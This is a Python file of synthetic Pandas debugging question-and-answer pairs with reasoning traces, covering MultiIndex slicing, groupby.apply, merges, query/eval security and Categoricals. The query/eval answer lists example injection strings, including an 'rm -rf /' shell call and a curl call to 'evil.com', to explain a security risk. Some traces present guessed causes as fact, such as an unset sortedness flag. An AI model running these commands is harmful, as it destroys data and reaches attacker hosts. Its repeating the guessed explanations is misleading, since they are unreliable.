"""Thinking-trace pairs: advanced Pandas debugging."""

PAIRS = [
    (
        "thinking/debugging",
        r'''I have a Pandas DataFrame with a MultiIndex and I'm getting unexpected results when slicing. Here is my code:

import pandas as pd
import numpy as np

arrays = [
    ["bar", "bar", "baz", "baz", "foo", "foo"],
    ["one", "two", "one", "two", "one", "two"],
]
tuples = list(zip(*arrays))
index = pd.MultiIndex.from_tuples(tuples, names=["first", "second"])
df = pd.DataFrame(np.random.randn(6, 3), index=index, columns=["A", "B", "C"])

# This works fine
result1 = df.loc["bar"]

# But this raises KeyError
result2 = df.loc["bar":"foo"]

# And this gives wrong results
result3 = df.loc[("bar", "one"):("foo", "two")]

Why is the slicing failing and how do I fix it?''',
        r'''<think>
Let me analyze the MultiIndex slicing issues one by one.

First issue: `df.loc["bar":"foo"]` raising KeyError. My first thought was that "bar" and "foo" are not valid index values, but they clearly are since `df.loc["bar"]` works fine. So the problem is specific to slice-based selection, not single-label selection.

Hmm, could it be a sorting issue? MultiIndex slicing with label-based ranges requires the index to be sorted lexicographically. If the index is not sorted, Pandas cannot efficiently determine where the slice boundaries are. It would need to do a full scan to find all entries between "bar" and "foo", which Pandas refuses to do -- instead it raises UnsortedIndexError or KeyError. Let me check: `from_tuples` preserves the order you give it, and ["bar", "bar", "baz", "baz", "foo", "foo"] IS already sorted... wait, is it? b-a-r, b-a-z, f-o-o -- yes, that is lexicographic order. So why would it fail?

Actually, I need to check `df.index.is_monotonic_increasing`. Even though the first level looks sorted, the COMBINED MultiIndex might not be considered sorted if there are issues with the second level. Let me reconsider... ("bar", "one"), ("bar", "two"), ("baz", "one"), ("baz", "two"), ("foo", "one"), ("foo", "two") -- that IS monotonically sorted. Hmm, maybe the issue is version-dependent, or maybe the KeyError message is different from what I assumed.

Wait -- I think the problem is that `from_tuples` does not automatically set the `is_monotonic_increasing` flag even if the data happens to be sorted. Calling `sort_index()` explicitly both sorts AND sets the flag. Without the flag, Pandas refuses slice operations because it cannot guarantee correctness. That would explain why the sort fixes it even when the data is already in order.

For the second issue, tuple-based slicing `df.loc[("bar", "one"):("foo", "two")]` depends on the same sorting requirement, and additionally on how Pandas interprets tuple boundaries in the slice.

The fix is clear: always call `df.sort_index()` before slicing a MultiIndex. For more targeted selections, `pd.IndexSlice` or `.xs()` are safer alternatives that work regardless of sort order.
</think>

The root cause is that MultiIndex slicing requires a **sorted index**. Pandas cannot do efficient label-based slicing on an unsorted MultiIndex and will raise `UnsortedIndexError` (or `KeyError` depending on the version).

Here is the corrected code with explanations:

```python
import pandas as pd
import numpy as np

arrays = [
    ["bar", "bar", "baz", "baz", "foo", "foo"],
    ["one", "two", "one", "two", "one", "two"],
]
tuples = list(zip(*arrays))
index = pd.MultiIndex.from_tuples(tuples, names=["first", "second"])
df = pd.DataFrame(np.random.randn(6, 3), index=index, columns=["A", "B", "C"])

# STEP 1: Sort the index first -- this is REQUIRED for slice-based loc
df = df.sort_index()

# Now this works: slice on first level
result2 = df.loc["bar":"foo"]
print("Slice bar to foo:")
print(result2)

# Tuple-based slicing also works now
result3 = df.loc[("bar", "one"):("foo", "two")]
print("\nTuple slice (bar,one) to (foo,two):")
print(result3)

# ALTERNATIVE: Use pd.IndexSlice for more explicit slicing
idx = pd.IndexSlice

# Select all rows where first level is "bar" or "baz"
result4 = df.loc[idx["bar":"baz", :], :]
print("\nUsing IndexSlice for bar:baz, all second level:")
print(result4)

# Select specific second-level values across all first levels
result5 = df.loc[idx[:, "one"], :]
print("\nAll first levels, second level = one:")
print(result5)

# ALTERNATIVE 2: Use .xs() for cross-section selection
# This does not require a sorted index
result6 = df.xs("one", level="second")
print("\nCross-section where second=one:")
print(result6)
```

Key rules for MultiIndex slicing:

1. **Always call `df.sort_index()`** before using slice notation with `.loc[]`. Without sorting, Pandas cannot determine the boundaries of the slice efficiently.

2. **Use `pd.IndexSlice`** for complex multi-level slices -- it makes the intent clearer and avoids ambiguity between tuple indexing and multi-level indexing.

3. **Use `.xs()`** when you want a cross-section at a particular level -- it works regardless of sort order and is often more readable.

4. **Check `df.index.is_monotonic_increasing`** to verify whether your index is sorted before slicing. If it returns False, your slices will fail or produce incorrect results.''',
    ),
    (
        "thinking/debugging",
        r'''My Pandas groupby().apply() is returning duplicate index entries and the shape of the result is wrong. Here is my code:

import pandas as pd

df = pd.DataFrame({
    "group": ["A", "A", "A", "B", "B", "B"],
    "value": [10, 20, 30, 40, 50, 60],
    "weight": [1, 2, 3, 1, 2, 3],
})

def weighted_avg(group_df):
    return pd.Series({
        "weighted_mean": (group_df["value"] * group_df["weight"]).sum() / group_df["weight"].sum(),
        "count": len(group_df),
    })

result = df.groupby("group").apply(weighted_avg)
print(result)
# Expected: 2 rows (one per group) with weighted_mean and count columns
# Actual: Getting 6 rows with duplicated group index

What is going wrong?''',
        r'''<think>
Let me think about what could cause 6 rows instead of 2 with `groupby().apply()`.

The function `weighted_avg` returns a `pd.Series` with 2 entries (weighted_mean and count). There are 2 groups (A and B). So I would expect 2 rows x 2 columns = a 2x2 DataFrame. But the user says they get 6 rows. Where do the extra 4 rows come from?

My first thought: could `apply()` be running the function per-ROW rather than per-GROUP? That would give 6 calls (one per row). But `groupby("group").apply(...)` should pass each group as a sub-DataFrame, not individual rows. Unless there is a bug in how the groups are formed.

Wait -- could this be the `group_keys=True` issue? When `group_keys=True` (the default), Pandas prepends the group key to the result's index. If the function returns a Series with index ["weighted_mean", "count"], the result would have a MultiIndex: (A, "weighted_mean"), (A, "count"), (B, "weighted_mean"), (B, "count") -- that is 4 rows, not 6.

Hmm, 6 rows would suggest the result is being aligned back to the original DataFrame's index somehow. In some Pandas versions, `apply()` tries to "broadcast" the result back to the original shape when it detects the returned object could be aligned. If the function returns a Series whose length happens to match the group size (3 entries per group), Pandas might interpret it as a per-row result and align it to the original index.

Actually, the function returns a Series with 2 entries, and each group has 3 rows. So the lengths do not match, and Pandas should not try to broadcast. But Pandas `apply()` is notoriously unpredictable -- it runs the function TWICE on the first group to infer the return type, which can cause side effects and duplicate results.

I think the most likely explanation is version-specific behavior where `group_keys=True` causes Pandas to reindex the result to the original DataFrame's 6-row index. The fix is straightforward: use `group_keys=False`, or better yet, avoid `apply()` entirely and use `.agg()` with named aggregations, which is faster and more predictable.
</think>

This is a well-known Pandas gotcha with `groupby().apply()`. The problem has several possible causes depending on your Pandas version:

```python
import pandas as pd

df = pd.DataFrame({
    "group": ["A", "A", "A", "B", "B", "B"],
    "value": [10, 20, 30, 40, 50, 60],
    "weight": [1, 2, 3, 1, 2, 3],
})

# PROBLEM: apply() with group_keys=True (default) can cause index issues
# In some Pandas versions, the result gets a MultiIndex or is reindexed
# to the original DataFrame index.

# FIX 1: Use group_keys=False
def weighted_avg(group_df):
    return pd.Series({
        "weighted_mean": (group_df["value"] * group_df["weight"]).sum() / group_df["weight"].sum(),
        "count": len(group_df),
    })

result = df.groupby("group", group_keys=False).apply(weighted_avg)
print("Fix 1 - group_keys=False:")
print(result)
print(f"Shape: {result.shape}")  # Should be (2, 2)

# FIX 2 (PREFERRED): Use .agg() with named aggregation instead of apply()
# This is faster and avoids the apply() pitfalls entirely
result2 = df.groupby("group").agg(
    weighted_mean=("value", lambda x: (x * df.loc[x.index, "weight"]).sum() / df.loc[x.index, "weight"].sum()),
    count=("value", "count"),
)
print("\nFix 2 - named aggregation:")
print(result2)

# FIX 3: Compute weighted average without apply() at all
df["weighted_value"] = df["value"] * df["weight"]
result3 = pd.DataFrame({
    "weighted_mean": df.groupby("group")["weighted_value"].sum() / df.groupby("group")["weight"].sum(),
    "count": df.groupby("group")["value"].count(),
})
print("\nFix 3 - direct computation:")
print(result3)
```

**Why this happens:**

1. `group_keys=True` (the default) adds the group keys to the result index. When your function returns a Series, this can create a MultiIndex combining the group key with the Series index.

2. In some Pandas versions, `apply()` runs the function **twice** on the first group to infer the return type. If your function has side effects, this causes bugs.

3. The `apply()` function tries to be "smart" about combining results, and its heuristics sometimes guess wrong -- aligning results back to the original index instead of creating a new grouped result.

**Best practices:**
- Avoid `apply()` when possible -- use `agg()`, `transform()`, or vectorized operations
- Always pass `group_keys=False` if you do use `apply()`
- Never rely on side effects inside `apply()` functions
- Test with `print(result.index)` and `print(result.shape)` to verify the output structure''',
    ),
    (
        "thinking/debugging",
        r'''I am merging two DataFrames and getting unexpected duplicate rows. My code:

import pandas as pd

orders = pd.DataFrame({
    "order_id": [1, 2, 3, 4],
    "customer": ["Alice", "Bob", "Alice", "Charlie"],
    "amount": [100, 200, 150, 300],
})

customers = pd.DataFrame({
    "customer": ["Alice", "Bob", "Charlie", "Alice"],
    "region": ["East", "West", "East", "North"],
})

merged = orders.merge(customers, on="customer")
print(merged)
# Expected: 4 rows (one per order)
# Actual: 6 rows -- Alice orders are duplicated

How do I fix the merge to not produce duplicates?''',
        r'''<think>
The user expects 4 rows but gets 6. Let me count: 4 orders, so where do the extra 2 rows come from?

Looking at the customers DataFrame: Alice appears TWICE with different regions (East and North). When Pandas merges on "customer", it creates a Cartesian product for matching keys. So each Alice order gets matched to BOTH Alice customer rows.

Wait, let me count carefully:
- Order 1 (Alice) x Customer Alice-East = 1 row
- Order 1 (Alice) x Customer Alice-North = 1 row
- Order 2 (Bob) x Customer Bob-West = 1 row
- Order 3 (Alice) x Customer Alice-East = 1 row
- Order 3 (Alice) x Customer Alice-North = 1 row
- Order 4 (Charlie) x Customer Charlie-East = 1 row
Total: 6 rows. That matches what the user sees.

My first instinct was "the merge is broken" -- but actually, the merge is doing exactly what it should. An inner join on duplicate keys produces a Cartesian product. The real bug is in the DATA, not the merge operation. The customers table has duplicate entries for Alice.

Hmm, but is the data actually wrong? Maybe Alice legitimately has two regions (she moved, or works in both). The fix depends on the business logic:
1. If each customer should have one region -> deduplicate customers first
2. If customers can have multiple regions -> the merge is correct, but the user needs to decide which region to use (or aggregate them into a list)
3. If the user just wants to catch this early -> use `validate="many_to_one"` to raise an error when the right side has duplicates

I initially overlooked the `validate` parameter, which is actually the most important recommendation. Setting `validate="many_to_one"` makes Pandas raise a `MergeError` immediately if the right DataFrame has duplicate keys. This catches data quality issues before they silently corrupt results. The default `validate="many_to_many"` is dangerous because it never complains about duplicates.
</think>

The problem is that your `customers` DataFrame has **duplicate keys** -- "Alice" appears twice with different regions ("East" and "North"). When Pandas does a merge, it creates a **Cartesian product** for matching keys: each Alice order matches both Alice customer rows, doubling those rows.

Here is how to diagnose and fix this:

```python
import pandas as pd

orders = pd.DataFrame({
    "order_id": [1, 2, 3, 4],
    "customer": ["Alice", "Bob", "Alice", "Charlie"],
    "amount": [100, 200, 150, 300],
})

customers = pd.DataFrame({
    "customer": ["Alice", "Bob", "Charlie", "Alice"],
    "region": ["East", "West", "East", "North"],
})

# DIAGNOSIS: Check for duplicate keys BEFORE merging
print("Duplicate customers:", customers["customer"].duplicated().sum())
print("Duplicated rows:")
print(customers[customers["customer"].duplicated(keep=False)])

# FIX 1: Use validate parameter to catch this early
# This will raise MergeError if the right side has duplicate keys
try:
    merged = orders.merge(customers, on="customer", validate="many_to_one")
except pd.errors.MergeError as e:
    print(f"Merge validation failed: {e}")

# FIX 2: Deduplicate the right DataFrame first (keep first occurrence)
customers_deduped = customers.drop_duplicates(subset="customer", keep="first")
merged_fix2 = orders.merge(customers_deduped, on="customer")
print("\nFix 2 - drop_duplicates (keep first):")
print(merged_fix2)

# FIX 3: Deduplicate by choosing a specific row (e.g., most recent)
# If you had a timestamp, you would sort by it first
customers_latest = (
    customers
    .sort_values("customer")  # or sort by a date column
    .groupby("customer")
    .last()
    .reset_index()
)
merged_fix3 = orders.merge(customers_latest, on="customer")
print("\nFix 3 - groupby last:")
print(merged_fix3)

# FIX 4: If multiple regions are valid, aggregate them
customers_agg = (
    customers
    .groupby("customer")["region"]
    .agg(list)
    .reset_index()
)
merged_fix4 = orders.merge(customers_agg, on="customer")
print("\nFix 4 - aggregate regions into list:")
print(merged_fix4)

# PREVENTION: Always use validate parameter in production code
# "one_to_one"  - both sides unique
# "one_to_many"  - left side unique
# "many_to_one"  - right side unique
# "many_to_many" - no validation (default, dangerous)
```

**Key takeaway:** Always use the `validate` parameter in production merges. The default `many_to_many` silently creates Cartesian products on duplicate keys, which is almost never what you want. Setting `validate="many_to_one"` or `validate="one_to_one"` will immediately surface data quality issues before they corrupt your analysis.''',
    ),
    (
        "thinking/debugging",
        r'''I'm using pd.eval() and df.query() in my Pandas application for performance but getting strange errors and security concerns. Here is my code:

import pandas as pd
import numpy as np

df = pd.DataFrame({
    "price": [10.5, 20.3, 15.7, 30.1],
    "quantity": [100, 200, 150, 50],
    "category": ["A", "B", "A", "B"],
})

# This works
result1 = df.query("price > 15")

# This fails with "undefined variable" error
min_price = 15
result2 = df.query("price > min_price")

# Security concern: can users inject code through query strings?
user_input = "price > 10"  # what if this is malicious?
result3 = df.query(user_input)

How do I fix the variable reference issue and handle the security concern?''',
        r'''<think>
Two separate issues here. Let me tackle each one.

**Issue 1: "undefined variable" error with `df.query("price > min_price")`**
My first thought was that `min_price` should just work as a local variable reference. But wait -- inside a query string, bare identifiers are treated as COLUMN names, not Python variables. Pandas looks for a column called `min_price` in the DataFrame, does not find it, and raises an error. To reference a local/global variable, you must prefix it with `@`. So it should be `df.query("price > @min_price")`.

Hmm, could I also use an f-string like `f"price > {min_price}"`? That would substitute the value directly into the string. It works for simple numeric values, but it is dangerous for strings (injection risk) and fragile for edge cases like NaN or None. The `@` prefix is the proper mechanism.

**Issue 2: Security of query() and eval()**
The user asks whether malicious input could be injected through query strings. My first instinct was "pd.eval is limited, it cannot run arbitrary code." But actually, that is not entirely true. The `python` engine uses Python's `eval()` under the hood, which CAN execute arbitrary code. The `numexpr` engine is more restricted, but even it might have escape vectors.

Wait, can `__import__('os').system('rm -rf /')` actually run through pd.eval? With the `python` engine, possibly yes. With `numexpr`, it should be blocked because numexpr only supports arithmetic operations. But relying on the engine choice for security is fragile -- if someone changes the engine parameter or a future Pandas version changes defaults, the security boundary breaks.

The correct answer is: NEVER pass user-controlled strings to `query()` or `pd.eval()`. Instead, build filters programmatically using boolean indexing (`df[df["price"] > value]`). This is safe because the column name and operator are controlled by the developer, and the value is just a Python object -- no code execution.
</think>

There are two distinct issues here: variable scoping syntax and security risks.

**Issue 1: Variable References**

In `df.query()` and `pd.eval()`, local and global variables must be prefixed with `@`:

```python
import pandas as pd
import numpy as np

df = pd.DataFrame({
    "price": [10.5, 20.3, 15.7, 30.1],
    "quantity": [100, 200, 150, 50],
    "category": ["A", "B", "A", "B"],
})

min_price = 15
max_qty = 150

# WRONG: bare variable names are treated as column references
# result = df.query("price > min_price")  # KeyError: 'min_price'

# CORRECT: prefix local/global variables with @
result = df.query("price > @min_price")
print(result)

# Multiple variable references work the same way
result2 = df.query("price > @min_price and quantity <= @max_qty")
print(result2)

# You can also reference variables in pd.eval()
df["total"] = pd.eval("df.price * df.quantity")

# For f-string-style interpolation (less clean but works without @)
result3 = df.query(f"price > {min_price}")
print(result3)
```

**Issue 2: Security of query() and eval()**

```python
# DANGER: Never pass untrusted user input to query() or eval()

# Example of what a malicious user could do:
malicious_inputs = [
    "__import__('os').system('rm -rf /')",  # shell command injection
    "__import__('subprocess').call(['curl', 'evil.com'])",
    "price > 0; import os",  # statement injection
]

# The 'numexpr' engine (default) blocks most attacks but is NOT foolproof
# The 'python' engine is essentially raw eval() and is VERY dangerous

# SAFE APPROACH: Validate and sanitize user input
import re

def safe_query(df, user_filter):
    """Safely filter a DataFrame based on user input."""
    # Whitelist allowed column names
    allowed_columns = set(df.columns)

    # Whitelist allowed operators
    allowed_pattern = re.compile(
        r'^[\w\s\.\,\(\)><=!&|+\-*/]+$'
    )

    if not allowed_pattern.match(user_filter):
        raise ValueError(f"Invalid filter expression: {user_filter}")

    # Check that only known column names are used as identifiers
    # Extract all word tokens from the expression
    tokens = re.findall(r'[a-zA-Z_]\w*', user_filter)
    keywords = {"and", "or", "not", "in", "True", "False", "None"}

    for token in tokens:
        if token not in allowed_columns and token not in keywords:
            # Check if it is a number-like string
            try:
                float(token)
            except ValueError:
                raise ValueError(
                    f"Unknown identifier in filter: '{token}'. "
                    f"Allowed columns: {allowed_columns}"
                )

    return df.query(user_filter, engine="numexpr")

# Usage
try:
    result = safe_query(df, "price > 15 and quantity < 200")
    print("Safe query result:")
    print(result)
except ValueError as e:
    print(f"Rejected: {e}")

# BEST APPROACH: Don't use query() with user input at all.
# Instead, build filters programmatically:
def build_filter(df, column, operator, value):
    """Build a filter mask without eval/query."""
    if column not in df.columns:
        raise ValueError(f"Unknown column: {column}")
    ops = {
        ">": lambda col, val: col > val,
        "<": lambda col, val: col < val,
        ">=": lambda col, val: col >= val,
        "<=": lambda col, val: col <= val,
        "==": lambda col, val: col == val,
        "!=": lambda col, val: col != val,
    }
    if operator not in ops:
        raise ValueError(f"Unknown operator: {operator}")
    return df[ops[operator](df[column], value)]

result = build_filter(df, "price", ">", 15)
print("Programmatic filter result:")
print(result)
```

**Summary:** Use `@` for variable references in query/eval. Never pass user-controlled strings to `query()` or `pd.eval()` -- build filters programmatically instead.''',
    ),
    (
        "thinking/debugging",
        r'''My Pandas Categorical column is causing problems when I try to filter and merge. Here is my code:

import pandas as pd

df = pd.DataFrame({
    "status": pd.Categorical(["active", "inactive", "active", "pending"],
                              categories=["active", "inactive", "pending"]),
    "value": [10, 20, 30, 40],
})

# Problem 1: filtering produces empty result when I expect matches
filtered = df[df["status"] == "Active"]  # capital A
print(f"Filtered: {len(filtered)} rows")  # 0 rows!

# Problem 2: assigning a new value not in categories raises error
df.loc[0, "status"] = "archived"

# Problem 3: merging with non-categorical column behaves oddly
other = pd.DataFrame({"status": ["active", "inactive"], "label": ["A", "I"]})
merged = df.merge(other, on="status")

What are the issues and how to handle categoricals properly?''',
        r'''<think>
Three issues with Categorical columns. Let me work through each one.

**Problem 1: filtering produces empty result with "Active" (capital A)**
My first thought was that the filter is wrong syntax, but `df[df["status"] == "Active"]` is perfectly valid Pandas. The issue is simpler: "Active" != "active". Categorical comparisons are exact string matches with no case folding. Since "Active" (with capital A) is not in the categories ["active", "inactive", "pending"], the comparison returns False for every row.

Wait, but would this also happen with regular string columns? Yes, `==` is always case-sensitive in Python. The difference with categoricals is that the strict type system might tempt users to think categories handle normalization. They do not.

**Problem 2: assigning "archived" raises TypeError**
Hmm, this is because Categorical enforces a closed set of allowed values. Assigning "archived" is like trying to insert a value that violates a CHECK constraint in a database. You must first add "archived" to the categories via `.cat.add_categories()`, then assign. I initially thought this was just a Pandas quirk, but it is actually an intentional data integrity feature -- it prevents typos and unexpected values from silently entering the data.

**Problem 3: merging categorical with non-categorical**
This is more subtle. When you merge a categorical column (left) with a regular string column (right), Pandas needs to compare values across different dtypes. In newer Pandas versions, this usually works because Pandas casts internally. But in older versions, or when the categories differ, you can get unexpected results -- rows that should match might not because of dtype mismatch. The safest fix is to convert both columns to the same type before merging: either both to string or both to categorical with matching categories.

Actually, I should also mention the memory benefit of categoricals. A column with 1M rows but only 3 unique values uses much less memory as Categorical (stores integer codes + 3 category labels) versus object dtype (stores 1M string references). So categoricals are worth using despite these gotchas.
</think>

Categorical columns in Pandas are strict about their allowed values and comparisons. Here are the fixes for each problem:

```python
import pandas as pd
import numpy as np

df = pd.DataFrame({
    "status": pd.Categorical(
        ["active", "inactive", "active", "pending"],
        categories=["active", "inactive", "pending"]
    ),
    "value": [10, 20, 30, 40],
})

# ============================================================
# PROBLEM 1: Case-sensitive comparison
# ============================================================
# "Active" != "active" -- categoricals are case-sensitive
filtered_wrong = df[df["status"] == "Active"]  # 0 rows
filtered_right = df[df["status"] == "active"]  # 2 rows
print(f"Wrong case: {len(filtered_wrong)} rows")
print(f"Right case: {len(filtered_right)} rows")

# If you need case-insensitive matching, convert to string first
filtered_ci = df[df["status"].str.lower() == "active".lower()]
print(f"Case-insensitive: {len(filtered_ci)} rows")

# ============================================================
# PROBLEM 2: Assigning values not in categories
# ============================================================
# This raises TypeError: Cannot setitem on a Categorical with a new category
try:
    df.loc[0, "status"] = "archived"
except TypeError as e:
    print(f"Error: {e}")

# FIX 2a: Add the category first, then assign
df["status"] = df["status"].cat.add_categories(["archived"])
df.loc[0, "status"] = "archived"
print("\nAfter adding category and assigning:")
print(df["status"])

# FIX 2b: Use set_categories to replace all categories at once
df["status"] = df["status"].cat.set_categories(
    ["active", "inactive", "pending", "archived", "deleted"]
)

# FIX 2c: Remove unused categories to keep things clean
print(f"\nCategories before: {df['status'].cat.categories.tolist()}")
df["status"] = df["status"].cat.remove_unused_categories()
print(f"Categories after cleanup: {df['status'].cat.categories.tolist()}")

# ============================================================
# PROBLEM 3: Merging categorical with non-categorical
# ============================================================
other = pd.DataFrame({
    "status": ["active", "inactive"],
    "label": ["A", "I"],
})

# Check types before merging
print(f"\ndf status dtype: {df['status'].dtype}")
print(f"other status dtype: {other['status'].dtype}")

# FIX 3a: Convert categorical to string before merging
df_str = df.copy()
df_str["status"] = df_str["status"].astype(str)
merged = df_str.merge(other, on="status")
print("\nMerged (after converting to str):")
print(merged)

# FIX 3b: Convert both to categorical with same categories
shared_cats = list(
    set(df["status"].cat.categories) | set(other["status"].unique())
)
df_cat = df.copy()
other_cat = other.copy()
df_cat["status"] = df_cat["status"].cat.set_categories(shared_cats)
other_cat["status"] = pd.Categorical(other_cat["status"], categories=shared_cats)
merged2 = df_cat.merge(other_cat, on="status")
print("\nMerged (matching categoricals):")
print(merged2)

# ============================================================
# BEST PRACTICES for Categoricals
# ============================================================
# 1. Use categoricals for columns with a small fixed set of values
#    (e.g., status, region, priority) -- saves memory
# 2. Always define categories explicitly if order matters
#    pd.Categorical(data, categories=[...], ordered=True)
# 3. Convert to string before operations that might introduce
#    new values (user input, merges with external data)
# 4. Use .cat accessor for category management:
#    .cat.add_categories(), .cat.remove_categories(),
#    .cat.rename_categories(), .cat.reorder_categories()
# 5. Check df.dtypes before merges to catch type mismatches
```

**Key insight:** Categoricals enforce a closed set of allowed values. This is a feature for data integrity, but it becomes a bug when your code assumes string-like flexibility. Convert to string when you need flexibility; keep categorical when you need memory efficiency and data validation.''',
    ),
]
